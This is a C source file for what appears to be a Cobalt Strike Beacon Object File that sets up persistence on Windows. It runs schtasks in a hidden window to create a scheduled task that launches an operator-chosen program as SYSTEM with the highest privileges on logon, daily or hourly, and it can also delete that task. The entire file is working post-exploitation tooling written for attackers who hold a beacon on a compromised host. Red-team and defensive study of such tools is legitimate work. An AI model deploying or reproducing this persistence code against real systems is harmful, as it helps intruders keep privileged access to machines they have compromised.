#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

// Scheduled Task Persistence
// Creates a scheduled task for persistence using schtasks command

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char *buffer, const char *format, ...);

#ifdef BOF
void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int action = BeaconDataInt(&parser);  // 0 = create, 1 = delete
    CHAR* taskName = BeaconDataExtract(&parser, NULL);
    CHAR* programPath = BeaconDataExtract(&parser, NULL);
    CHAR* trigger = BeaconDataExtract(&parser, NULL);  // ONLOGON, DAILY, HOURLY
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scheduled Task Persistence\n");
    
    char command[2048];
    
    if (action == 0)  // Create task
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating scheduled task...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Task Name: %s\n", taskName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Program: %s\n", programPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Trigger: %s\n", trigger);
        
        // Build schtasks command
        // /F = force (overwrite if exists)
        // /RU SYSTEM = run as SYSTEM account
        // /RL HIGHEST = run with highest privileges
        if (MSVCRT$sprintf(command, "cmd.exe /c schtasks /Create /F /TN \"%s\" /TR \"%s\" /SC %s /RU SYSTEM /RL HIGHEST",
                          taskName, programPath, trigger) < 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build command\n");
            return;
        }
    }
    else  // Delete task
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Deleting scheduled task...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Task Name: %s\n", taskName);
        
        if (MSVCRT$sprintf(command, "cmd.exe /c schtasks /Delete /F /TN \"%s\"", taskName) < 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build command\n");
            return;
        }
    }
    
    // Execute schtasks command
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!KERNEL32$CreateProcessA(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to execute schtasks command\n");
        BeaconPrintf(CALLBACK_ERROR, "[-] Error: %d\n", KERNEL32$GetLastError());
        return;
    }
    
    // Wait for completion (max 10 seconds)
    DWORD waitResult = KERNEL32$WaitForSingleObject(pi.hProcess, 10000);
    
    DWORD exitCode;
    if (KERNEL32$GetExitCodeProcess(pi.hProcess, &exitCode))
    {
        if (exitCode == 0)
        {
            if (action == 0)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully created scheduled task\n");
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Task will run on trigger: %s\n", trigger);
            }
            else
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted scheduled task\n");
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] schtasks command failed with exit code: %d\n", exitCode);
            if (action == 0 && exitCode == 1)
            {
                BeaconPrintf(CALLBACK_ERROR, "[-] Common causes: Insufficient privileges, invalid parameters\n");
            }
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get exit code\n");
    }
    
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Scheduled task operation completed\n");
}
#endif

